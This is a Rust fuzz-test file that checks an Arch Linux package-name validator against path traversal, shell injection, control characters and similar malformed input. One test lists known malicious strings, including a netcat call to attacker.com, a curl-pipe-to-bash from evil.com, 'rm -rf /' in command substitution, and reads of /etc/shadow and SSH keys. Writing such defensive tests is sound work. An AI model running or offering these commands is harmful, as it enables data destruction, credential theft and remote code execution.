#![no_main]
use libfuzzer_sys::fuzz_target;

/// Validate package name for security and correctness
///
/// This is a reference implementation that should be moved to
/// src/core/security/validation.rs in production.
fn is_valid_package_name(name: &str) -> bool {
    // Length check (0 = invalid, >255 = potential DoS)
    if name.is_empty() || name.len() > 255 {
        return false;
    }

    // Null byte check (C string injection)
    if name.contains('\0') {
        return false;
    }

    // Path traversal check
    if name.contains("..") {
        return false;
    }

    // Path separator check
    if name.contains('/') || name.contains('\\') {
        return false;
    }

    // Shell injection check - dangerous characters
    let dangerous_chars = [';', '&', '|', '`', '$', '(', ')', '{', '}', '[', ']', '\n', '\r', '\t'];
    if name.chars().any(|c| dangerous_chars.contains(&c)) {
        return false;
    }

    // Control character check
    if name.chars().any(|c| c.is_control()) {
        return false;
    }

    // Arch Linux package name rules:
    // - Must start with alphanumeric or underscore
    // - Can contain: a-z, 0-9, @, ., _, +, -
    // - Must be lowercase (Arch convention)
    let first_char = name.chars().next().unwrap();
    if !first_char.is_ascii_alphanumeric() && first_char != '_' {
        return false;
    }

    // All characters must be valid
    for c in name.chars() {
        if !matches!(c, 'a'..='z' | '0'..='9' | '@' | '.' | '_' | '+' | '-') {
            return false;
        }
    }

    true
}

fuzz_target!(|data: &[u8]| {
    if let Ok(s) = std::str::from_utf8(data) {
        // Test 1: Should never panic, even on malicious input
        let is_valid = is_valid_package_name(s);

        // Test 2: Path traversal attempts should be rejected
        if s.contains("..") {
            assert!(!is_valid, "Path traversal should be rejected: {}", s);
        }

        // Test 3: Absolute paths should be rejected
        if s.starts_with('/') {
            assert!(!is_valid, "Absolute path should be rejected: {}", s);
        }

        // Test 4: Shell injection characters should be rejected
        let dangerous_chars = [';', '&', '|', '`', '$', '\n', '\0'];
        if s.chars().any(|c| dangerous_chars.contains(&c)) {
            assert!(!is_valid, "Shell injection chars should be rejected: {}", s);
        }

        // Test 5: Length validation
        if s.len() > 255 {
            assert!(!is_valid, "Names > 255 chars should be rejected");
        }

        // Test 6: Empty names should be rejected
        if s.is_empty() {
            assert!(!is_valid, "Empty names should be rejected");
        }

        // Test 7: Control characters should be rejected
        if s.chars().any(|c| c.is_control()) {
            assert!(!is_valid, "Control characters should be rejected: {:?}", s);
        }

        // Test 8: Valid names should pass basic checks
        if is_valid {
            assert!(!s.is_empty(), "Valid name cannot be empty");
            assert!(s.len() <= 255, "Valid name must be <= 255 chars");
            assert!(!s.contains(".."), "Valid name cannot contain ..");
            assert!(!s.contains('/'), "Valid name cannot contain /");
            assert!(!s.contains('\\'), "Valid name cannot contain \\");

            // Should not contain any uppercase
            assert!(s.chars().all(|c| !c.is_ascii_uppercase()),
                "Valid Arch package name should be lowercase: {}", s);

            // First char should be alphanumeric or underscore
            if let Some(first) = s.chars().next() {
                assert!(first.is_ascii_alphanumeric() || first == '_',
                    "Valid name should start with alphanumeric or underscore: {}", s);
            }
        }

        // Test 9: Known malicious patterns should be rejected
        let malicious_patterns = [
            "../../../etc/passwd",
            "$(rm -rf /)",
            "; DROP TABLE packages;",
            "\0root\0",
            "../../root/.ssh/authorized_keys",
            "pkg`reboot`",
            "pkg;cat /etc/shadow",
            "pkg|nc attacker.com 1234",
            "pkg&curl evil.com/shell.sh|bash",
        ];

        for pattern in malicious_patterns {
            if s == pattern || s.contains(pattern) {
                assert!(!is_valid,
                    "Known malicious pattern should be rejected: {}", pattern);
            }
        }

        // Test 10: SQL injection attempts should be rejected (even though we don't use SQL)
        if s.contains("DROP") || s.contains("SELECT") || s.contains("INSERT") || s.contains("DELETE") {
            assert!(!is_valid, "SQL-like commands should be rejected: {}", s);
        }

        // Test 11: Unicode validation - only ASCII allowed for Arch packages
        if s.chars().any(|c| !c.is_ascii()) {
            assert!(!is_valid, "Non-ASCII characters should be rejected: {}", s);
        }

        // Test 12: Windows path traversal variants
        if s.contains("..\\") || s.contains("C:\\") || s.contains("D:\\") {
            assert!(!is_valid, "Windows path patterns should be rejected: {}", s);
        }

        // Test 13: Repeated validation should be consistent
        let is_valid2 = is_valid_package_name(s);
        assert_eq!(is_valid, is_valid2, "Validation should be deterministic");

        // Test 14: Case sensitivity - uppercase should be rejected
        if s.chars().any(|c| c.is_ascii_uppercase()) {
            assert!(!is_valid, "Uppercase letters should be rejected: {}", s);
        }

        // Test 15: Special Arch package naming rules
        // Valid examples: firefox, lib32-glibc, python-numpy, gtk3
        if is_valid {
            // Should only contain allowed characters
            for c in s.chars() {
                assert!(
                    c.is_ascii_lowercase() || c.is_ascii_digit() || "@._+-".contains(c),
                    "Invalid character in valid name: {} in {}", c, s
                );
            }
        }

        // Test 16: Environment variable injection attempts
        if s.contains("${") || s.contains("$(") {
            assert!(!is_valid, "Environment variable patterns should be rejected: {}", s);
        }

        // Test 17: Backtick command substitution
        if s.contains('`') {
            assert!(!is_valid, "Backtick command substitution should be rejected: {}", s);
        }

        // Test 18: Null byte injection (C string termination)
        if s.contains('\0') {
            assert!(!is_valid, "Null byte should be rejected: {:?}", s);
        }

        // Test 19: Newline/carriage return injection
        if s.contains('\n') || s.contains('\r') {
            assert!(!is_valid, "Newline characters should be rejected: {:?}", s);
        }

        // Test 20: Tab character injection
        if s.contains('\t') {
            assert!(!is_valid, "Tab character should be rejected: {:?}", s);
        }
    }
});
